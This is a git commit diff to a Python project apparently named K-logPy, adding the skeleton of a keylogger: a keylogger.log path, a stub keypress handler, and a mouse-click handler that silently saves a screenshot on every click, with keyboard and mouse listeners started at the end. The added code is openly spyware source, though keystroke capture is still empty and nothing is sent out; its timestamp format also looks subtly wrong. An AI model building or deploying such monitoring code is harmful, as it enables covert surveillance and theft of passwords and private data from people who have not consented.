e6900902928a79ea4c3f9d171fdb3f3ccd3ff2db
Beulke-Dono <arthurbeulke@gmail.com>
2023-03-17 19:41:35 -0400

    on_click function created

--- K-logPy/klp/main.py
+++ K-logPy/klp/main.py
@@ -6,8 +6,28 @@ import re, os, pyautogui as pyt
 datanow = datetime.now()
 data = datanow.strftime('%d-%m')
 save = r'C:\Users\arthu\Desktop\Save\Content_' + data + '/'
+arqlog = save + 'keylogger.log'
 
 try:
     os.mkdir(save)
 except:
     pass
+
+def on_press():
+    pass
+
+def on_click(x, y, button, pressed):
+    if pressed:
+        Print = pyt.screenshot()
+        hora = datetime.now()
+        horaprint = hora.strftime('%h:%m:%s')
+        Print.save(os.path.join(save, 'printklp_'+ horaprint +'.jpg'))
+
+
+keyboardListener = KeyboardListener(on_press=on_press)
+mouseListener = MouseListener(on_click=on_click)
+
+keyboardListener.start()
+mouseListener.start()
+keyboardListener.join()
+mouseListener.join()
